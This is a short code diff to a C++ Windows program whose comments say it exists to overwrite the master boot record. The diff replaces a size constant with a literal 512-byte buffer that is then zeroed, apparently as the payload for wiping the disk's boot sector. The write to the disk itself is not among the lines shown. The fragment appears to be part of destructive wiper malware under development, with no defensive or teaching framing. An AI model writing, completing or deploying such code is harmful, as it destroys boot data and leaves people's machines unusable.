@@ -2,14 +2,14 @@
 #include <Windows.h>
 using namespace std;
 
-#define MBR_SIZE 512
+//#define MBR_SIZE 512
 
 int main() {
   
   DWORD write;
   
-  char mbrData[MBR_SIZE]; // size of master boot record
-  
+  //char mbrData[MBR_SIZE]; // size of master boot record
+  char mbrData[512];
   //Overwrite the  MBR
   ZeroMemory(&mbrData, (sizeof mbrData));
   
